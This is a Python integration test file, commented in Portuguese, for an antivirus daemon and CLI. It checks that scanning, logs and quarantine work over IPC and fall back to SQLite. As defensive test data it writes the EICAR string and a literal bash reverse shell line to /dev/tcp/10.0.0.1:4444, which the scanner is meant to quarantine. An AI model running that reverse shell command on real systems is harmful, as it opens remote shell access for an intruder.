"""
tests/test_cli_ipc.py
======================
Testes de integração end-to-end: sobe o daemon real (subprocess, socket
Unix de verdade) e valida contra ele os comandos CLI migrados pro padrão
"IPC primeiro, cai pro SQLite direto se o daemon não estiver rodando"
(Patch 11 — ver docs/architecture.md).

Gap que este arquivo fecha (registrado em EK-Protection.md, rodadas
2026-08-23/08-24): a suite unitária cobre cada módulo isolado com mocks,
mas nunca sobe um daemon real nem invoca a CLI como processo — os bugs
de "exige sudo" corrigidos no Patch 11 só tinham validação manual, sem
teste automatizado que pegasse uma regressão futura.

Cada teste roda em ambiente isolado (EKP_DATA_DIR por tmp_path do
pytest), nunca toca configuração ou dados reais do sistema.
"""

from __future__ import annotations

import os
import subprocess
import sys
import time
from pathlib import Path
from typing import Iterator

import pytest

# Arquivo EICAR padrão da indústria (inofensivo, feito pra ser detectado)
# e o SHA-256 real correspondente, já corrigido na assinatura demo do
# scanner (ver ekprotection/scanner/signatures.py).
EICAR_CONTENT = (
    r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
)
EICAR_SHA256 = "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"

_BIN_DIR = Path(sys.executable).parent


def _run_cli(*args: str, env: dict) -> subprocess.CompletedProcess:
    return subprocess.run(
        [str(_BIN_DIR / "ekp"), *args],
        env=env,
        capture_output=True,
        text=True,
        timeout=15,
    )


@pytest.fixture
def lab_env(tmp_path: Path) -> dict:
    """Ambiente isolado: EKP_DATA_DIR próprio + config.yaml próprio, nunca
    toca /var/lib, /var/log, /run ou /etc reais."""
    watch_dir = tmp_path / "watch"
    watch_dir.mkdir()
    config_path = tmp_path / "config.yaml"
    config_path.write_text(
        f"monitor:\n  paths:\n    - {watch_dir}\n"
        "signatures:\n  auto_update: false\n"
    )

    env = dict(os.environ)
    env["EKP_DATA_DIR"] = str(tmp_path)
    env["EKP_CONFIG_PATH_FOR_TEST"] = str(config_path)  # só uso interno do teste
    return env


@pytest.fixture
def running_daemon(lab_env: dict) -> Iterator[dict]:
    """Sobe `ekp start` (foreground) como subprocesso real, aguarda o
    socket IPC responder, e garante encerramento limpo no teardown."""
    config_path = lab_env["EKP_CONFIG_PATH_FOR_TEST"]
    proc = subprocess.Popen(
        [str(_BIN_DIR / "ekp"), "start", "--config", config_path],
        env=lab_env,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
    )

    socket_path = f"{lab_env['EKP_DATA_DIR']}/run/daemon.sock"
    from ekprotection.daemon import IPCClient
    client = IPCClient(socket_path)

    deadline = time.monotonic() + 10
    alive = False
    while time.monotonic() < deadline:
        if proc.poll() is not None:
            out = proc.stdout.read() if proc.stdout else ""
            pytest.fail(f"Daemon morreu ao subir (ambiente isolado):\n{out}")
        if client.is_alive():
            alive = True
            break
        time.sleep(0.2)

    if not alive:
        proc.terminate()
        proc.wait(timeout=5)
        pytest.fail("Daemon não respondeu via IPC dentro do timeout (10s).")

    try:
        yield lab_env
    finally:
        if proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait(timeout=5)


# ---------------------------------------------------------------------------
# ekp logs tail — via daemon (IPC) e fallback direto ao SQLite
# ---------------------------------------------------------------------------

class TestLogsTail:
    def test_tail_via_daemon_ipc(self, running_daemon: dict) -> None:
        config_path = running_daemon["EKP_CONFIG_PATH_FOR_TEST"]
        result = _run_cli("logs", "tail", "-n", "10", "--config", config_path, env=running_daemon)
        assert result.returncode == 0, result.stdout + result.stderr
        # O próprio start do engine grava um evento "system.start" nos logs
        # estruturados — se aparece aqui, o round-trip via IPC funcionou.
        assert "system.start" in result.stdout

    def test_tail_fallback_direct_sqlite_after_daemon_stopped(
        self, running_daemon: dict
    ) -> None:
        config_path = running_daemon["EKP_CONFIG_PATH_FOR_TEST"]
        # Confirma via IPC primeiro...
        result_ipc = _run_cli("logs", "tail", "-n", "10", "--config", config_path, env=running_daemon)
        assert result_ipc.returncode == 0

        # ...depois derruba o daemon e confirma que o mesmo comando ainda
        # funciona lendo o SQLite direto (fallback do padrão Patch 11).
        stop = _run_cli("stop", "--config", config_path, env=running_daemon)
        assert stop.returncode == 0, stop.stdout + stop.stderr
        time.sleep(0.5)

        result_direct = _run_cli("logs", "tail", "-n", "10", "--config", config_path, env=running_daemon)
        assert result_direct.returncode == 0, result_direct.stdout + result_direct.stderr
        assert "system.start" in result_direct.stdout


# ---------------------------------------------------------------------------
# ekp exceptions list — via daemon (IPC)
# ---------------------------------------------------------------------------

class TestExceptionsListViaIPC:
    def test_list_reflects_entry_added_directly(self, running_daemon: dict) -> None:
        config_path = running_daemon["EKP_CONFIG_PATH_FOR_TEST"]

        add = _run_cli(
            "exceptions", "add", "whitelist", "path", "/tmp/algum-caminho-confiavel",
            "--comment", "teste-integracao", "--config", config_path,
            env=running_daemon,
        )
        assert add.returncode == 0, add.stdout + add.stderr

        result = _run_cli(
            "exceptions", "list", "--json", "--config", config_path, env=running_daemon
        )
        assert result.returncode == 0, result.stdout + result.stderr

        import json
        entries = json.loads(result.stdout)
        assert any(e["value"] == "/tmp/algum-caminho-confiavel" for e in entries)


# ---------------------------------------------------------------------------
# ekp scan file — via daemon (IPC), detecção real do EICAR
# ---------------------------------------------------------------------------

class TestScanFileViaIPC:
    def test_scan_eicar_via_daemon_detects_threat(
        self, running_daemon: dict, tmp_path: Path
    ) -> None:
        config_path = running_daemon["EKP_CONFIG_PATH_FOR_TEST"]
        eicar_path = tmp_path / "eicar_test_file.com"
        eicar_path.write_text(EICAR_CONTENT)

        import hashlib
        assert hashlib.sha256(eicar_path.read_bytes()).hexdigest() == EICAR_SHA256

        result = _run_cli(
            "scan", "file", str(eicar_path), "--json", "--config", config_path,
            env=running_daemon,
        )
        # Exit code 1 é o comportamento esperado quando uma ameaça é
        # detectada (convenção estilo grep/clamscan) — não é um erro do CLI.
        assert result.returncode == 1, result.stdout + result.stderr

        import json
        data = json.loads(result.stdout)
        assert data["verdict"].lower() in ("threat", "ameaça", "ameaca")
        assert data["threat_name"] == "EICAR.Test.File"


# ---------------------------------------------------------------------------
# ekp scan full / paths — via daemon (IPC streaming, Patch 11)
# ---------------------------------------------------------------------------

class TestScanStreamingViaIPC:
    """Cobre o item que ficou pendente 3 rodadas seguidas (08-23/08-24/08-25)
    no roadmap Patch 11: scan_quick/scan_full/scan_paths via IPC exigem
    progresso streamado pelo socket, diferente do request/response de 1
    linha só usado pelos outros comandos — ver protocolo em daemon.py."""

    def test_scan_full_via_daemon_detects_eicar(
        self, running_daemon: dict, tmp_path: Path
    ) -> None:
        config_path = running_daemon["EKP_CONFIG_PATH_FOR_TEST"]
        # lab_env aponta monitor.paths pro mesmo watch_dir usado aqui —
        # `ekp scan full` sem args escaneia exatamente essa pasta.
        watch_dir = tmp_path / "watch"
        eicar_path = watch_dir / "eicar_test_file.com"
        eicar_path.write_text(EICAR_CONTENT)

        result = _run_cli(
            "scan", "full", "--json", "--config", config_path, env=running_daemon
        )
        assert result.returncode == 1, result.stdout + result.stderr

        import json
        data = json.loads(result.stdout)
        assert data["scan_type"] == "full"
        assert data["threats_found"] == 1
        assert data["errors"] == 0

    def test_scan_paths_via_daemon_streams_progress_and_falls_back(
        self, running_daemon: dict, tmp_path: Path
    ) -> None:
        config_path = running_daemon["EKP_CONFIG_PATH_FOR_TEST"]
        watch_dir = tmp_path / "watch"
        clean_path = watch_dir / "arquivo_limpo.txt"
        clean_path.write_text("nada de suspeito aqui")

        # Via IPC (daemon rodando)...
        result_ipc = _run_cli(
            "scan", "paths", str(watch_dir), "--json", "--config", config_path,
            env=running_daemon,
        )
        assert result_ipc.returncode == 0, result_ipc.stdout + result_ipc.stderr
        import json
        data_ipc = json.loads(result_ipc.stdout)
        assert data_ipc["scan_type"] == "paths"
        assert data_ipc["scanned_files"] == 1
        assert data_ipc["threats_found"] == 0

        # ...depois derruba o daemon e confirma o fallback pro scan local
        # direto (sem IPC) chega no mesmo resultado.
        stop = _run_cli("stop", "--config", config_path, env=running_daemon)
        assert stop.returncode == 0, stop.stdout + stop.stderr
        time.sleep(0.5)

        result_direct = _run_cli(
            "scan", "paths", str(watch_dir), "--json", "--config", config_path,
            env=running_daemon,
        )
        assert result_direct.returncode == 0, result_direct.stdout + result_direct.stderr
        data_direct = json.loads(result_direct.stdout)
        assert data_direct["scanned_files"] == 1
        assert data_direct["threats_found"] == 0


# ---------------------------------------------------------------------------
# ekp quarantine info / stats — via daemon (IPC), fecha o último gap real
# de sudo do Patch 11 (cmd_list já tinha sido migrado em 2026-08-22, info/
# stats continuavam abrindo o SQLite root-owned direto)
# ---------------------------------------------------------------------------

# Reverse shell literal inofensivo (nunca executado, só o padrão de texto
# que um invasor real usaria) — mesmo conteúdo do teste intenso de invasão
# simulada de 2026-08-29 (tests/test_engine.py), reaproveitado aqui só pra
# gerar um item real em quarentena via `ekp scan file` (que também dispara
# auto-quarentena, igual ao caminho do monitor).
_REVERSE_SHELL_CONTENT = b"#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"


class TestQuarantineInfoStatsViaIPC:
    def _quarantine_one_item(
        self, running_daemon: dict, tmp_path: Path
    ) -> dict:
        """Escaneia um reverse shell simulado via `ekp scan file` (daemon
        real) pra gerar um item de quarentena de verdade, e retorna o
        dict da entrada via `ekp quarantine list --json`."""
        config_path = running_daemon["EKP_CONFIG_PATH_FOR_TEST"]
        evil_path = tmp_path / "update.sh"
        evil_path.write_bytes(_REVERSE_SHELL_CONTENT)

        scan = _run_cli(
            "scan", "file", str(evil_path), "--json", "--config", config_path,
            env=running_daemon,
        )
        assert scan.returncode == 1, scan.stdout + scan.stderr  # ameaça detectada

        listing = _run_cli(
            "quarantine", "list", "--json", "--config", config_path,
            env=running_daemon,
        )
        assert listing.returncode == 0, listing.stdout + listing.stderr

        import json
        entries = json.loads(listing.stdout)
        assert len(entries) == 1, "esperava exatamente 1 item auto-quarentenado"
        return entries[0]

    def test_info_via_daemon_ipc(self, running_daemon: dict, tmp_path: Path) -> None:
        entry = self._quarantine_one_item(running_daemon, tmp_path)
        config_path = running_daemon["EKP_CONFIG_PATH_FOR_TEST"]

        result = _run_cli(
            "quarantine", "info", str(entry["id"]), "--json", "--config", config_path,
            env=running_daemon,
        )
        assert result.returncode == 0, result.stdout + result.stderr

        import json
        data = json.loads(result.stdout)
        assert data["quarantine_id"] == entry["quarantine_id"]
        assert data["sha256"] == entry["sha256"]

    def test_stats_via_daemon_ipc(self, running_daemon: dict, tmp_path: Path) -> None:
        self._quarantine_one_item(running_daemon, tmp_path)
        config_path = running_daemon["EKP_CONFIG_PATH_FOR_TEST"]

        result = _run_cli(
            "quarantine", "stats", "--json", "--config", config_path, env=running_daemon,
        )
        assert result.returncode == 0, result.stdout + result.stderr

        import json
        data = json.loads(result.stdout)
        assert data["active"] == 1
        assert data["total"] == 1

    def test_info_and_stats_fallback_direct_sqlite_after_daemon_stopped(
        self, running_daemon: dict, tmp_path: Path
    ) -> None:
        entry = self._quarantine_one_item(running_daemon, tmp_path)
        config_path = running_daemon["EKP_CONFIG_PATH_FOR_TEST"]

        stop = _run_cli("stop", "--config", config_path, env=running_daemon)
        assert stop.returncode == 0, stop.stdout + stop.stderr
        time.sleep(0.5)

        import json

        info = _run_cli(
            "quarantine", "info", str(entry["id"]), "--json", "--config", config_path,
            env=running_daemon,
        )
        assert info.returncode == 0, info.stdout + info.stderr
        assert json.loads(info.stdout)["quarantine_id"] == entry["quarantine_id"]

        stats = _run_cli(
            "quarantine", "stats", "--json", "--config", config_path, env=running_daemon,
        )
        assert stats.returncode == 0, stats.stdout + stats.stderr
        assert json.loads(stats.stdout)["active"] == 1
